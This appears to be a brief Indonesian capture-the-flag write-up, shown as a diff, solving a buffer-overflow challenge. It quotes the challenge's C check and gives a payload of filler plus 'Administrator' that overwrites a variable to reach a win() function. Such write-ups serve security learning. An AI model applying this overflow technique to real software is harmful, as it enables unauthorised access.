@@ -1,0 +1,15 @@
+ini merupakan buffer overflow sederhana, kita hanya perlu mencari offset nya berapa, terdeteksi 80,kemudian kita baca juga 
+source code nya 
+
+if ( strncmp(nama_staff,"Administrator",13) == 0 ){
+                printf("Selamat Datang %s\n",nama);
+                win();
+        }else{
+                printf("Selamat Datang %s\n",nama);
+                printf("Nama Staff yang membuat ticket kamu : %s\n",nama_staff);
+        }
+
+
+ternyata perlu tambahan "Adminstrator" untuk bisa mengakses fungsi win
+
+payload = AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAdministrator
